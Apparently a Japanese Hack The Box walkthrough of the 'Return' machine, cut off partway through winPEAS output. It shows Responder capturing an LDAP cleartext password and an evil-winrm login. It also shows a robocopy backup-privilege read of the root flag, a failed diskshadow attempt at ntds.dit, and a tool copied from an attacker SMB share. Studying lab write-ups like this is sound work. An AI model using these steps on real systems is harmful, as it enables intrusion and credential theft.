https://app.hackthebox.com/machines/401

## STEP 1
80番がオープン
```sh
└─$ rustscan -a 10.129.84.177 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.84.177:53
Open 10.129.84.177:80
Open 10.129.84.177:88
Open 10.129.84.177:135
Open 10.129.84.177:139
Open 10.129.84.177:389
Open 10.129.84.177:445
Open 10.129.84.177:464
Open 10.129.84.177:593
Open 10.129.84.177:636
Open 10.129.84.177:3268
Open 10.129.84.177:3269
Open 10.129.84.177:5985
Open 10.129.84.177:9389
Open 10.129.84.177:47001
Open 10.129.84.177:49665
Open 10.129.84.177:49667
Open 10.129.84.177:49664
Open 10.129.84.177:49666
Open 10.129.84.177:49674
Open 10.129.84.177:49671
Open 10.129.84.177:49675
Open 10.129.84.177:49677
Open 10.129.84.177:49681
Open 10.129.84.177:49697
10.129.84.177 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49665,49667,49664,49666,49674,49671,49675,49677,49681,49697]
```


## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_01.png">  
settings.phpというページを発見、svc-printerはユーザ名？  
パスワードは非表示になっている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_02.png">  
settings.phpのソースを見ても、パスワードは確認できなかった  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_03.png">  
ここで実際にsettings.phpの「update」をクリックし、httpリクエストを確認  
settings.phpの「Server Address」の情報のみが送信されている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_04.png">  
ここでsettings.phpの「Server Address」にkaliのipを指定して送信すると  
ldap上のsvc-printerのクレデンシャルをkali側で受信した！
```sh
└─$ sudo responder -I tun0 -v                
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.11]
    Responder IPv6             [dead:beef:4::1009]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-8VTH5NT7SRF]
    Responder Domain Name      [LWXF.LOCAL]
    Responder DCE-RPC Port     [46813]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                             

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.84.177
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```
5985番ポートが開いていたので、winrmでログイン成功！  
ユーザフラグゲット
```sh
└─$ evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.84.177
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cat ../Desktop/user.txt
7ff57babb71ca751440b3a4cf191d885
```


## STEP 3
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
`SeBackupPrivilege`が有効になっている  
SeBackupPrivilegeは[リンク](https://learn.microsoft.com/ja-jp/windows-hardware/drivers/ifs/privileges)の通り、オブジェクトのACLをバイパスしてアクセスが可能  
ただ[リンク](https://serverfault.com/questions/980880/sebackupprivilege-but-cannot-read-all-files)でもある通り、この権限は専用のAPIを使用したプログラムでないと適用されない  
robocopyコマンドを使用すればルートフラグをゲットできるが、せっかくなのでシェルをとる
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy "C:\Users\administrator\Desktop" "C:\Users\svc-printer\Documents\" "root.txt" /B /NFL /NDL /NJH /NJS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\Users\svc-printer\Documents\root.txt
278a2f7f1595036f612ce6fcfce54b52
```
ローカルだと、レジストリのSAM・SYSTEMをダンプすればクレデンシャルを取得できるが  
今回はADのクレデンシャルを取得するために、レジストリ以外に`ntds.dit`を取得する必要がある  
[リンク](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)を確認する限り、ntds.ditはシステムで使用中のためSeBackupPrivilege権限でもコピーできないが、  
`vss`サービスを用いた`diskshadow`コマンドでコピーが可能  
ただリンク通りに実行してもうまくシャドーコピーできなかった
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


*Evil-WinRM* PS C:\Users\svc-printer\Documents> diskshadow /s vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  PRINTER,  10/6/2025 4:43:00 PM

-> set context persistent nowriters
-> add volume c: alias raj

COM call "(*vssObject)->InitializeForBackup" failed.
```


## STEP 4
winpeasで列挙
```sh
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .

└─$ impacket-smbserver share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
whoamiでも確認できた通り、`Server Operators`に所属しているためサービスの編集が可能になっている
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> copy \\10.10.16.11\share\winPEASx64.exe .

*Evil-WinRM* PS C:\Users\svc-printer\Documents> .\winPEASx64.exe servicesinfo quiet
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\                                                                                      
       |                             Do you like PEASS?                                  |                                                                                      
       |---------------------------------------------------------------------------------|                                                                                      
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                      
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                      
       |         Respect on HTB            :     SirBroccoli                             |                                                                                      
       |---------------------------------------------------------------------------------|                                                                                      
       |                                 Thank you!                                      |                                                                                      
       \---------------------------------------------------------------------------------/                                                                                      
                                                                                                                                                                                
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...                                                                                                              
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                                                  
   at System.Management.ManagementScope.Initialize()                                                                                                                            
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                                   
   at System.Management.ManagementObjectSearcher.Get()                                                                                                                          
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                                     
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
        [skipped, file search is disabled]


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Cavium, Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot
   =================================================================================================

    @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Cavium, Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot
   =================================================================================================

    @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(QLogic Corporation - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System
   =================================================================================================

    @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem4.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    HKLM\system\currentcontrolset\services\.NET CLR Data (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET CLR Networking (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NETFramework (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\1394ohci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\3ware (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ACPI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiDev (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\acpiex (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\acpipagr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiPmi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\acpitime (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ADOVMPPackage (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ADP80XX (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\adsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ADWS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AFD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\afunix (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ahcache (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AJRouter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ALG (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AmdK8 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AmdPPM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\amdsata (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\amdsbs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\amdxata (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppHostSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppID (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppIDSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Appinfo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\applockerfltr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppMgmt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppReadiness (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppVClient (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppvStrm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppvVemgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppvVfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppXSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\arcsas (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AsyncMac (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\atapi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AudioEndpointBuilder (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Audiosrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AxInstSV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\b06bdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bam (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BasicDisplay (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BasicRender (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BattC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bcmfn2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Beep (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bfadfcoei (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bfadi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BFE (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bindflt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BITS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bowser (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BrokerInfrastructure (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BTAGService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BthAvctpSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BthEnum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BthLEEnum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BthMini (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BTHPORT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bthserv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BTHUSB (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bttflt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\buttonconverter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bxfcoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bxois (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\camsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CapImg (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CaptureService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cbdhsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cdfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CDPSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CDPUserSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cdrom (Server Operators [Allow: WriteKey GenericWrite])
